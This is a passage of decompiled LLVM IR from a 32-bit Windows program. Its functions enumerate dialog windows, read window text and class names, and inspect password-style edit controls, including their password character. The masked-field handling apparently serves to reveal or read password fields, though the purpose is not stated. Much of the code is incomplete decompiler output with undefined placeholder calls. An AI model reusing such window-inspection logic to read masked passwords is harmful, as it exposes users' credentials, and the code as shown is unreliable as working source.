  %stack_var_-52 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  store i32 0, i32* %stack_var_-8, align 4, !insn.addr !1696
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1697
  store i32 %0, i32* %stack_var_-40, align 4, !insn.addr !1697
  %1 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !1697
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1698
  store i32 %arg2, i32* %stack_var_-44, align 4, !insn.addr !1699
  %2 = ptrtoint i32* %stack_var_-44 to i32, !insn.addr !1699
  %3 = inttoptr i32 %arg2 to i32*, !insn.addr !1700
  %4 = call i1 @IsWindowVisible(i32* %3), !insn.addr !1700
  %5 = icmp eq i1 %4, false, !insn.addr !1701
  store i32 %2, i32* %esp.0.reg2mem, !insn.addr !1702
  br i1 %5, label %dec_label_pc_406e7b, label %dec_label_pc_406dfb, !insn.addr !1702

dec_label_pc_406dfb:                              ; preds = %dec_label_pc_406dc4
  store i32 %arg2, i32* %stack_var_-52, align 4, !insn.addr !1703
  %6 = ptrtoint i32* %stack_var_-52 to i32, !insn.addr !1703
  %7 = call i32 @GetClassLongA(i32* inttoptr (i32 -32 to i32*), i32 %arg2), !insn.addr !1704
  %8 = icmp eq i32 %7, 32770, !insn.addr !1705
  %9 = icmp eq i1 %8, false, !insn.addr !1706
  store i32 %6, i32* %esp.0.reg2mem, !insn.addr !1706
  br i1 %9, label %dec_label_pc_406e7b, label %dec_label_pc_406e0a, !insn.addr !1706

dec_label_pc_406e0a:                              ; preds = %dec_label_pc_406dfb
  store i32 %arg2, i32* %stack_var_-56, align 4, !insn.addr !1707
  %10 = ptrtoint i32* %stack_var_-56 to i32, !insn.addr !1707
  %11 = call i32* @GetParent(i32* %3), !insn.addr !1708
  %12 = ptrtoint i32* %11 to i32, !insn.addr !1708
  %13 = add i32 %arg1, 4, !insn.addr !1709
  %14 = inttoptr i32 %13 to i32*, !insn.addr !1709
  %15 = load i32, i32* %14, align 4, !insn.addr !1709
  %16 = icmp eq i32 %15, %12, !insn.addr !1709
  %17 = icmp eq i1 %16, false, !insn.addr !1710
  store i32 %10, i32* %esp.0.reg2mem, !insn.addr !1710
  br i1 %17, label %dec_label_pc_406e7b, label %dec_label_pc_406e15, !insn.addr !1710

dec_label_pc_406e15:                              ; preds = %dec_label_pc_406e0a
  store i32 %arg2, i32* %stack_var_-64, align 4, !insn.addr !1711
  %18 = ptrtoint i32* %stack_var_-64 to i32, !insn.addr !1711
  %19 = call i32 @GetWindowThreadProcessId(i32* nonnull %stack_var_-8, i32* %3), !insn.addr !1712
  %20 = inttoptr i32 %arg1 to i32*, !insn.addr !1713
  %21 = load i32, i32* %20, align 4, !insn.addr !1713
  %22 = load i32, i32* %stack_var_-8, align 4, !insn.addr !1714
  %23 = icmp eq i32 %21, %22, !insn.addr !1714
  %24 = icmp eq i1 %23, false, !insn.addr !1715
  store i32 %18, i32* %esp.0.reg2mem, !insn.addr !1715
  br i1 %24, label %dec_label_pc_406e7b, label %dec_label_pc_406e26, !insn.addr !1715

dec_label_pc_406e26:                              ; preds = %dec_label_pc_406e15
  %25 = add i32 %arg1, 8, !insn.addr !1716
  %26 = inttoptr i32 %25 to i32*, !insn.addr !1716
  %27 = load i32, i32* %26, align 4, !insn.addr !1716
  %28 = icmp eq i32 %27, 0, !insn.addr !1716
  br i1 %28, label %dec_label_pc_406e50, label %dec_label_pc_406e2c, !insn.addr !1717

dec_label_pc_406e2c:                              ; preds = %dec_label_pc_406e26
  %29 = call i32 @function_406f9c(), !insn.addr !1718
  %30 = call i32 @"@LStrFromPChar"(), !insn.addr !1719
  %31 = call i32 @"@LStrCmp"(), !insn.addr !1720
  store i32 %18, i32* %esp.0.reg2mem
  br label %dec_label_pc_406e7b

dec_label_pc_406e50:                              ; preds = %dec_label_pc_406e26
  %32 = add i32 %arg1, 12, !insn.addr !1721
  %33 = inttoptr i32 %32 to i32*, !insn.addr !1721
  %34 = load i32, i32* %33, align 4, !insn.addr !1721
  %35 = add i32 %arg1, 16, !insn.addr !1722
  %36 = inttoptr i32 %35 to i32*, !insn.addr !1722
  %37 = load i32, i32* %36, align 4, !insn.addr !1722
  %38 = inttoptr i32 %34 to i32*, !insn.addr !1723
  %39 = inttoptr i32 %37 to i32*, !insn.addr !1723
  %40 = inttoptr i32 %arg2 to i8*, !insn.addr !1723
  %41 = call i32* @FindWindowExA(i32* %38, i32* %39, i8* null, i8* %40), !insn.addr !1723
  %42 = ptrtoint i32* %41 to i32, !insn.addr !1723
  %43 = add i32 %arg1, 24, !insn.addr !1724
  %44 = inttoptr i32 %43 to i32*, !insn.addr !1724
  store i32 %42, i32* %44, align 4, !insn.addr !1724
  store i32 %42, i32* %stack_var_-84, align 4, !insn.addr !1725
  %45 = ptrtoint i32* %stack_var_-84 to i32, !insn.addr !1725
  %46 = call i1 @IsWindow(i32* %41), !insn.addr !1726
  %47 = icmp eq i1 %46, false, !insn.addr !1727
  store i32 %45, i32* %esp.0.reg2mem, !insn.addr !1728
  br i1 %47, label %dec_label_pc_406e7b, label %dec_label_pc_406e76, !insn.addr !1728

dec_label_pc_406e76:                              ; preds = %dec_label_pc_406e50
  %48 = add i32 %arg1, 20, !insn.addr !1729
  %49 = inttoptr i32 %48 to i32*, !insn.addr !1729
  store i32 %arg2, i32* %49, align 4, !insn.addr !1729
  store i32 %45, i32* %esp.0.reg2mem, !insn.addr !1730
  br label %dec_label_pc_406e7b, !insn.addr !1730

dec_label_pc_406e7b:                              ; preds = %dec_label_pc_406e2c, %dec_label_pc_406e76, %dec_label_pc_406e50, %dec_label_pc_406e15, %dec_label_pc_406e0a, %dec_label_pc_406dfb, %dec_label_pc_406dc4
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %50 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !1731
  %51 = load i32, i32* %50, align 4, !insn.addr !1731
  call void @__writefsdword(i32 0, i32 %51), !insn.addr !1732
  %52 = add i32 %esp.0.reload, 8, !insn.addr !1733
  %53 = inttoptr i32 %52 to i32*, !insn.addr !1733
  store i32 4222621, i32* %53, align 4, !insn.addr !1733
  %54 = call i32 @"@LStrArrayClr"(), !insn.addr !1734
  ret i32 %54, !insn.addr !1735
}

define i32 @function_406e96() local_unnamed_addr {
dec_label_pc_406e96:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1736
  ret i32 %0, !insn.addr !1736
}

define i32 @function_406e9b() local_unnamed_addr {
dec_label_pc_406e9b:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1737
}

define i32 @function_406e9d(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_406e9d:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1738
}

define i32 @function_406ea8(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_406ea8:
  %esp.0.reg2mem = alloca i32, !insn.addr !1739
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %2 = ptrtoint i32* %stack_var_-60 to i32, !insn.addr !1740
  %3 = inttoptr i32 %0 to i32*, !insn.addr !1741
  %4 = inttoptr i32 %1 to i32*, !insn.addr !1741
  %5 = call i32 @GetWindowThreadProcessId(i32* %3, i32* %4), !insn.addr !1741
  %6 = call i32 @function_40441c(), !insn.addr !1742
  %7 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !1743
  store i32 %2, i32* %esp.0.reg2mem, !insn.addr !1744
  br label %dec_label_pc_406eec, !insn.addr !1744

dec_label_pc_406eec:                              ; preds = %dec_label_pc_406f0b, %dec_label_pc_406ea8
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %8 = add i32 %esp.0.reload, -4, !insn.addr !1743
  %9 = inttoptr i32 %8 to i32*, !insn.addr !1743
  store i32 %7, i32* %9, align 4, !insn.addr !1743
  %10 = add i32 %esp.0.reload, -8, !insn.addr !1745
  %11 = inttoptr i32 %10 to i32*, !insn.addr !1745
  store i32 4222404, i32* %11, align 4, !insn.addr !1745
  %12 = call i1 @EnumWindows(i1 (i32*, i32)* bitcast (i32* @0 to i1 (i32*, i32)*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1746
  %13 = add i32 %esp.0.reload, -12, !insn.addr !1747
  %14 = inttoptr i32 %13 to i32*, !insn.addr !1747
  store i32 1, i32* %14, align 4, !insn.addr !1747
  call void @Sleep(i32 ptrtoint (i32* @0 to i32)), !insn.addr !1748
  %15 = add i32 %esp.0.reload, -16, !insn.addr !1749
  %16 = inttoptr i32 %15 to i32*, !insn.addr !1749
  store i32 0, i32* %16, align 4, !insn.addr !1749
  %17 = call i1 @IsWindow(i32* nonnull @0), !insn.addr !1750
  %18 = icmp eq i1 %17, false, !insn.addr !1751
  %19 = icmp eq i1 %18, false, !insn.addr !1752
  br i1 %19, label %dec_label_pc_406f16, label %dec_label_pc_406f0b, !insn.addr !1752

dec_label_pc_406f0b:                              ; preds = %dec_label_pc_406eec
  %20 = call i32 @function_40441c(), !insn.addr !1753
  %21 = sub i32 %20, %6, !insn.addr !1754
  %22 = icmp ugt i32 %21, %arg2, !insn.addr !1755
  %23 = icmp eq i1 %22, false, !insn.addr !1756
  store i32 %15, i32* %esp.0.reg2mem, !insn.addr !1756
  br i1 %23, label %dec_label_pc_406eec, label %dec_label_pc_406f16, !insn.addr !1756

dec_label_pc_406f16:                              ; preds = %dec_label_pc_406f0b, %dec_label_pc_406eec
  ret i32 0, !insn.addr !1757
}

define i32 @function_406f30() local_unnamed_addr {
dec_label_pc_406f30:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = trunc i32 %0 to i8, !insn.addr !1758
  %.off = add i8 %1, -33
  %2 = icmp ult i8 %.off, 94
  %storemerge = sext i1 %2 to i32
  ret i32 %storemerge, !insn.addr !1759
}

define i32 @function_406f48(i32 %arg1) local_unnamed_addr {
dec_label_pc_406f48:
  %ecx.1.reg2mem = alloca i32, !insn.addr !1760
  %edi.0.reg2mem = alloca i32, !insn.addr !1760
  %ecx.0.reg2mem = alloca i32, !insn.addr !1760
  %0 = call i1 @__decompiler_undefined_function_1()
  %1 = select i1 %0, i32 -1, i32 1
  store i32 -1, i32* %ecx.0.reg2mem, !insn.addr !1761
  br label %2, !insn.addr !1761

; <label>:2:                                      ; preds = %4, %dec_label_pc_406f48
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %3 = icmp eq i32 %ecx.0.reload, 0, !insn.addr !1761
  store i32 0, i32* %ecx.1.reg2mem, !insn.addr !1761
  br i1 %3, label %10, label %4, !insn.addr !1761

; <label>:4:                                      ; preds = %2
  %edi.0.reload = load i32, i32* %edi.0.reg2mem
  %5 = inttoptr i32 %edi.0.reload to i8*, !insn.addr !1761
  %6 = load i8, i8* %5, align 1, !insn.addr !1761
  %7 = icmp eq i8 %6, 0, !insn.addr !1761
  %8 = add i32 %edi.0.reload, %1, !insn.addr !1761
  %9 = add i32 %ecx.0.reload, -1, !insn.addr !1761
  store i32 %9, i32* %ecx.0.reg2mem, !insn.addr !1761
  store i32 %8, i32* %edi.0.reg2mem, !insn.addr !1761
  store i32 %9, i32* %ecx.1.reg2mem, !insn.addr !1761
  br i1 %7, label %10, label %2, !insn.addr !1761

; <label>:10:                                     ; preds = %2, %4
  %ecx.1.reload = load i32, i32* %ecx.1.reg2mem
  %11 = sub i32 -2, %ecx.1.reload, !insn.addr !1762
  ret i32 %11, !insn.addr !1763
}

declare i32 @StrPas() local_unnamed_addr

declare i32 @StrCopy() local_unnamed_addr

define i32 @function_406f9c() local_unnamed_addr {
dec_label_pc_406f9c:
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-284 = alloca i32, align 4
  %1 = ptrtoint i32* %stack_var_-284 to i32, !insn.addr !1764
  %2 = inttoptr i32 %0 to i32*, !insn.addr !1765
  %3 = call i32 @SendMessageA(i32* %2, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1765
  %4 = add i32 %3, %1, !insn.addr !1766
  %5 = inttoptr i32 %4 to i8*, !insn.addr !1766
  store i8 0, i8* %5, align 1, !insn.addr !1766
  %6 = call i32 @"@LStrFromArray"(), !insn.addr !1767
  ret i32 %6, !insn.addr !1768
}

define i32 @function_406fd0() local_unnamed_addr {
dec_label_pc_406fd0:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-284 = alloca i32, align 4
  %2 = inttoptr i32 %0 to i8*, !insn.addr !1769
  %3 = ptrtoint i32* %stack_var_-284 to i32, !insn.addr !1770
  %4 = inttoptr i32 %1 to i32*, !insn.addr !1771
  %5 = call i32 @GetClassNameA(i32* %4, i8* %2, i32 ptrtoint (i32* @0 to i32)), !insn.addr !1771
  %6 = add i32 %5, %3, !insn.addr !1772
  %7 = inttoptr i32 %6 to i8*, !insn.addr !1772
  store i8 0, i8* %7, align 1, !insn.addr !1772
  %8 = call i32 @"@LStrFromArray"(), !insn.addr !1773
  ret i32 %8, !insn.addr !1774
}

define i32 @function_407008() local_unnamed_addr {
dec_label_pc_407008:
  %0 = call i32 @function_4034c8(), !insn.addr !1775
  %1 = call i32 @function_4034c8(), !insn.addr !1776
  %2 = call i32 @"@LStrCopy"(), !insn.addr !1777
  ret i32 %2, !insn.addr !1778
}

define i32 @function_407048() local_unnamed_addr {
dec_label_pc_407048:
  %0 = call i32 @function_4034c8(), !insn.addr !1779
  %1 = call i32 @"@LStrCopy"(), !insn.addr !1780
  ret i32 %1, !insn.addr !1781
}

define i32 @function_407080() local_unnamed_addr {
dec_label_pc_407080:
  %0 = call i32 @function_4036c8(), !insn.addr !1782
  %1 = call i32 @function_4036c8(), !insn.addr !1783
  %2 = call i32 @CompareStringA(i32 %1, i32 1, i8* inttoptr (i32 1024 to i8*), i32 ptrtoint (i32* @0 to i32), i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1784
  %3 = icmp eq i32 %2, 2, !insn.addr !1785
  %4 = zext i1 %3 to i32, !insn.addr !1786
  %5 = and i32 %2, -256, !insn.addr !1786
  %6 = or i32 %5, %4, !insn.addr !1786
  ret i32 %6, !insn.addr !1787
}

define i32 @function_4070b0() local_unnamed_addr {
dec_label_pc_4070b0:
  %.lcssa.reg2mem = alloca i32*, !insn.addr !1788
  %esp.0.lcssa.reg2mem = alloca i32, !insn.addr !1788
  %esp.02.reg2mem = alloca i32, !insn.addr !1788
  %storemerge3.reg2mem = alloca i32, !insn.addr !1788
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %1 = call i32 @__readfsdword(i32 0), !insn.addr !1789
  store i32 %1, i32* %stack_var_-32, align 4, !insn.addr !1789
  %2 = ptrtoint i32* %stack_var_-32 to i32, !insn.addr !1789
  call void @__writefsdword(i32 0, i32 %2), !insn.addr !1790
  %3 = ptrtoint i32* %stack_var_-36 to i32, !insn.addr !1791
  %4 = inttoptr i32 %0 to i32*, !insn.addr !1792
  %5 = call i32* @GetTopWindow(i32* %4), !insn.addr !1792
  %storemerge1 = ptrtoint i32* %5 to i32
  %6 = add i32 %3, -4, !insn.addr !1793
  %7 = inttoptr i32 %6 to i32*, !insn.addr !1793
  store i32 %storemerge1, i32* %7, align 4, !insn.addr !1793
  %8 = call i1 @IsWindow(i32* nonnull @0), !insn.addr !1794
  %9 = icmp eq i1 %8, false, !insn.addr !1795
  %10 = icmp eq i1 %9, false, !insn.addr !1796
  store i32 %storemerge1, i32* %storemerge3.reg2mem, !insn.addr !1796
  store i32 %3, i32* %esp.02.reg2mem, !insn.addr !1796
  store i32 %3, i32* %esp.0.lcssa.reg2mem, !insn.addr !1796
  store i32* %7, i32** %.lcssa.reg2mem, !insn.addr !1796
  br i1 %10, label %dec_label_pc_4070d4, label %dec_label_pc_407114, !insn.addr !1796

dec_label_pc_4070d4:                              ; preds = %dec_label_pc_4070b0, %dec_label_pc_4070d4
  %esp.02.reload = load i32, i32* %esp.02.reg2mem
  %storemerge3.reload = load i32, i32* %storemerge3.reg2mem
  %11 = call i32 @function_406f9c(), !insn.addr !1797
  %12 = call i32 @function_4070b0(), !insn.addr !1798
  %13 = add i32 %esp.02.reload, -8, !insn.addr !1799
  %14 = inttoptr i32 %13 to i32*, !insn.addr !1799
  store i32 2, i32* %14, align 4, !insn.addr !1799
  %15 = add i32 %esp.02.reload, -12, !insn.addr !1800
  %16 = inttoptr i32 %15 to i32*, !insn.addr !1800
  store i32 %storemerge3.reload, i32* %16, align 4, !insn.addr !1800
  %17 = call i32* @GetWindow(i32* nonnull @0, i32 ptrtoint (i32* @0 to i32)), !insn.addr !1801
  %storemerge = ptrtoint i32* %17 to i32
  %18 = add i32 %esp.02.reload, -16, !insn.addr !1793
  %19 = inttoptr i32 %18 to i32*
  store i32 %storemerge, i32* %19, align 4, !insn.addr !1793
  %20 = call i1 @IsWindow(i32* nonnull @0), !insn.addr !1794
  %21 = icmp eq i1 %20, false, !insn.addr !1795
  %22 = icmp eq i1 %21, false, !insn.addr !1796
  store i32 %storemerge, i32* %storemerge3.reg2mem, !insn.addr !1796
  store i32 %15, i32* %esp.02.reg2mem, !insn.addr !1796
  store i32 %15, i32* %esp.0.lcssa.reg2mem, !insn.addr !1796
  store i32* %19, i32** %.lcssa.reg2mem, !insn.addr !1796
  br i1 %22, label %dec_label_pc_4070d4, label %dec_label_pc_407114, !insn.addr !1796

dec_label_pc_407114:                              ; preds = %dec_label_pc_4070d4, %dec_label_pc_4070b0
  %.lcssa.reload = load i32*, i32** %.lcssa.reg2mem
  %esp.0.lcssa.reload = load i32, i32* %esp.0.lcssa.reg2mem
  %23 = load i32, i32* %.lcssa.reload, align 4, !insn.addr !1802
  call void @__writefsdword(i32 0, i32 %23), !insn.addr !1803
  %24 = add i32 %esp.0.lcssa.reload, 4, !insn.addr !1804
  %25 = inttoptr i32 %24 to i32*, !insn.addr !1804
  store i32 4223281, i32* %25, align 4, !insn.addr !1804
  %26 = call i32 @"@LStrClr"(), !insn.addr !1805
  ret i32 %26, !insn.addr !1806
}

define i32 @function_40712a() local_unnamed_addr {
dec_label_pc_40712a:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1807
  ret i32 %0, !insn.addr !1807
}

define i32 @function_40712f() local_unnamed_addr {
dec_label_pc_40712f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1808
}

define i32 @function_407131(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_407131:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1809
}

define i32 @function_40713c() local_unnamed_addr {
dec_label_pc_40713c:
  %stack_var_-28 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1810
  store i32 %0, i32* %stack_var_-28, align 4, !insn.addr !1810
  %1 = ptrtoint i32* %stack_var_-28 to i32, !insn.addr !1810
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1811
  %2 = call i32 @function_406fd0(), !insn.addr !1812
  %3 = call i32 @"@LStrCmp"(), !insn.addr !1813
  %4 = call i32 @function_4070b0(), !insn.addr !1814
  %5 = load i32, i32* %stack_var_-28, align 4, !insn.addr !1815
  call void @__writefsdword(i32 0, i32 %5), !insn.addr !1816
  %6 = call i32 @"@LStrClr"(), !insn.addr !1817
  ret i32 %6, !insn.addr !1818
}

define i32 @function_40719d() local_unnamed_addr {
dec_label_pc_40719d:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1819
  ret i32 %0, !insn.addr !1819
}

define i32 @function_4071a2() local_unnamed_addr {
dec_label_pc_4071a2:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1820
}

define i32 @function_4071a4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_4071a4:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1821
}

define i32 @function_4071bf() local_unnamed_addr {
dec_label_pc_4071bf:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %3 = add i32 %0, 1, !insn.addr !1822
  %4 = inttoptr i32 %0 to i32*, !insn.addr !1822
  store i32 %3, i32* %4, align 4, !insn.addr !1822
  %5 = bitcast i32* %eax to i8*
  %6 = load i8, i8* %5, align 4, !insn.addr !1823
  %7 = load i32, i32* %eax, align 4
  %8 = trunc i32 %7 to i8, !insn.addr !1823
  %9 = add i8 %6, %8, !insn.addr !1823
  %10 = inttoptr i32 %7 to i8*, !insn.addr !1823
  store i8 %9, i8* %10, align 1, !insn.addr !1823
  %11 = add i32 %2, 81, !insn.addr !1824
  %12 = inttoptr i32 %11 to i8*, !insn.addr !1824
  %13 = load i8, i8* %12, align 1, !insn.addr !1824
  %14 = trunc i32 %1 to i8, !insn.addr !1824
  %15 = add i8 %13, %14, !insn.addr !1824
  store i8 %15, i8* %12, align 1, !insn.addr !1824
  %16 = load i32, i32* %eax, align 4, !insn.addr !1825
  ret i32 %16, !insn.addr !1825
}

define x86_fp80 @function_4071c7() local_unnamed_addr {
dec_label_pc_4071c7:
  %0 = call x86_fp80 @__decompiler_undefined_function_10()
  %1 = fadd x86_fp80 %0, %0, !insn.addr !1826
  ret x86_fp80 %1, !insn.addr !1827
}

define i32 @function_4071cc() local_unnamed_addr {
dec_label_pc_4071cc:
  %esp.1.in.reg2mem = alloca i32*, !insn.addr !1828
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %1 = call i32 @__readfsdword(i32 0), !insn.addr !1829
  store i32 %1, i32* %stack_var_-24, align 4, !insn.addr !1829
  %2 = ptrtoint i32* %stack_var_-24 to i32, !insn.addr !1829
  call void @__writefsdword(i32 0, i32 %2), !insn.addr !1830
  %3 = call i32 @function_406fd0(), !insn.addr !1831
  %4 = call i32 @"@LStrCmp"(), !insn.addr !1832
  %5 = call i32 @GetWindowLongA(i32* inttoptr (i32 -12 to i32*), i32 %0), !insn.addr !1833
  %6 = icmp eq i32 %5, 180, !insn.addr !1834
  store i32* %stack_var_-32, i32** %esp.1.in.reg2mem, !insn.addr !1835
  br i1 %6, label %dec_label_pc_40722f, label %dec_label_pc_40720a, !insn.addr !1835

dec_label_pc_40720a:                              ; preds = %dec_label_pc_4071cc
  %7 = call i32 @GetWindowLongA(i32* inttoptr (i32 -16 to i32*), i32 %0), !insn.addr !1836
  %8 = and i32 %7, 32
  %9 = icmp eq i32 %8, 0, !insn.addr !1837
  %10 = icmp eq i1 %9, false, !insn.addr !1838
  store i32* %stack_var_-40, i32** %esp.1.in.reg2mem, !insn.addr !1838
  br i1 %10, label %dec_label_pc_40722f, label %dec_label_pc_407216, !insn.addr !1838

dec_label_pc_407216:                              ; preds = %dec_label_pc_40720a
  %11 = call i32 @SendMessageA(i32* null, i32 0, i32 210, i32 %0), !insn.addr !1839
  store i32* %stack_var_-56, i32** %esp.1.in.reg2mem
  br label %dec_label_pc_40722f

dec_label_pc_40722f:                              ; preds = %dec_label_pc_407216, %dec_label_pc_4071cc, %dec_label_pc_40720a
  %esp.1.in.reload = load i32*, i32** %esp.1.in.reg2mem
  %esp.1 = ptrtoint i32* %esp.1.in.reload to i32
  %12 = load i32, i32* %esp.1.in.reload, align 4, !insn.addr !1840
  call void @__writefsdword(i32 0, i32 %12), !insn.addr !1841
  %13 = add i32 %esp.1, 8, !insn.addr !1842
  %14 = inttoptr i32 %13 to i32*, !insn.addr !1842
  store i32 4223570, i32* %14, align 4, !insn.addr !1842
  %15 = call i32 @"@LStrClr"(), !insn.addr !1843
  ret i32 %15, !insn.addr !1844
}

define i32 @function_40724b() local_unnamed_addr {
dec_label_pc_40724b:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1845
  ret i32 %0, !insn.addr !1845
}

define i32 @function_407250() local_unnamed_addr {
dec_label_pc_407250:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1846
}

define i32 @function_407252(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_407252:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1847
}

define i32 @function_407268() local_unnamed_addr {
dec_label_pc_407268:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %2 = inttoptr i32 %0 to i32*, !insn.addr !1848
  %3 = call i32* @GetDC(i32* %2), !insn.addr !1848
  %4 = ptrtoint i32* %3 to i32, !insn.addr !1848
  %5 = call i32 @SendMessageA(i32* null, i32 0, i32 49, i32 %1), !insn.addr !1849
  %6 = inttoptr i32 %5 to i32*, !insn.addr !1850
  %7 = call i32* @SelectObject(i32* %6, i32* %3), !insn.addr !1850
  %8 = call i1 @GetCharWidthA(i32* nonnull %stack_var_-40, i32 42, i32 42, i32* %3), !insn.addr !1851
  %9 = call i32* @GetStockObject(i32 10), !insn.addr !1852
  %10 = call i32* @SelectObject(i32* %9, i32* %3), !insn.addr !1853
  %11 = inttoptr i32 %1 to i32*, !insn.addr !1854
  %12 = call i32 @ReleaseDC(i32* %3, i32* %11), !insn.addr !1854
  %13 = bitcast i32* %stack_var_-84 to %tagPOINT*
  %14 = call i1 @GetCaretPos(%tagPOINT* nonnull %13), !insn.addr !1855
  %15 = ptrtoint i32* %stack_var_-84 to i32, !insn.addr !1856
  %16 = ashr i32 %15, 31, !insn.addr !1857
  %17 = zext i32 %15 to i64, !insn.addr !1858
  %18 = zext i32 %16 to i64, !insn.addr !1858
  %19 = mul i64 %18, 4294967296, !insn.addr !1858
  %20 = or i64 %19, %17, !insn.addr !1858
  %21 = zext i32 %4 to i64, !insn.addr !1858
  %22 = sdiv i64 %20, %21, !insn.addr !1858
  %23 = trunc i64 %22 to i32, !insn.addr !1858
  ret i32 %23, !insn.addr !1859
}

define i32 @function_4072c4() local_unnamed_addr {
dec_label_pc_4072c4:
  %esp.0.reg2mem = alloca i32, !insn.addr !1860
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1861
  store i32 %0, i32* %stack_var_-28, align 4, !insn.addr !1861
  %1 = ptrtoint i32* %stack_var_-28 to i32, !insn.addr !1861
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1862
  %2 = load i32, i32* @global_var_408154, align 4, !insn.addr !1863
  %3 = icmp eq i32 %2, 0, !insn.addr !1863
  br i1 %3, label %dec_label_pc_407300, label %dec_label_pc_4072ed, !insn.addr !1864

dec_label_pc_4072ed:                              ; preds = %dec_label_pc_4072c4
  %4 = inttoptr i32 %2 to i32*, !insn.addr !1865
  store i32 0, i32* %4, align 4, !insn.addr !1865
  br label %dec_label_pc_407300, !insn.addr !1866

dec_label_pc_407300:                              ; preds = %dec_label_pc_4072ed, %dec_label_pc_4072c4
  %5 = load i32, i32* @global_var_40813c, align 4, !insn.addr !1867
  %6 = icmp eq i32 %5, 0, !insn.addr !1867
  br i1 %6, label %dec_label_pc_407314, label %dec_label_pc_40730a, !insn.addr !1868

dec_label_pc_40730a:                              ; preds = %dec_label_pc_407300
  %7 = load i32, i32* @global_var_408140, align 4, !insn.addr !1869
  %8 = icmp eq i32 %7, 0, !insn.addr !1869
  %9 = icmp eq i1 %8, false, !insn.addr !1870
  br i1 %9, label %dec_label_pc_40731e, label %dec_label_pc_407314, !insn.addr !1870

dec_label_pc_407314:                              ; preds = %dec_label_pc_40730a, %dec_label_pc_407300
  %10 = call i32 @function_4073f8(), !insn.addr !1871
  store i32 %1, i32* %esp.0.reg2mem, !insn.addr !1872
  br label %dec_label_pc_4073bb, !insn.addr !1872

dec_label_pc_40731e:                              ; preds = %dec_label_pc_40730a
  %11 = load i8, i8* bitcast (i32** @global_var_408160 to i8*), align 4, !insn.addr !1873
  %12 = icmp eq i8 %11, 0, !insn.addr !1873
  br i1 %12, label %dec_label_pc_407347, label %dec_label_pc_407328, !insn.addr !1874

dec_label_pc_407328:                              ; preds = %dec_label_pc_40731e
  %13 = call i32 @function_406be0(), !insn.addr !1875
  %14 = icmp eq i32 %13, 0, !insn.addr !1876
  br i1 %14, label %dec_label_pc_407347, label %dec_label_pc_407340, !insn.addr !1877

dec_label_pc_407340:                              ; preds = %dec_label_pc_407328
  %15 = call i32 @function_4073f8(), !insn.addr !1878
  store i32 %1, i32* %esp.0.reg2mem, !insn.addr !1879
  br label %dec_label_pc_4073bb, !insn.addr !1879

dec_label_pc_407347:                              ; preds = %dec_label_pc_407328, %dec_label_pc_40731e
  %16 = call i32 @"@LStrCatN"(), !insn.addr !1880
  %17 = call i32 @"@LStrAsg"(), !insn.addr !1881
  %18 = bitcast i32* %stack_var_-12 to %_SECURITY_ATTRIBUTES*
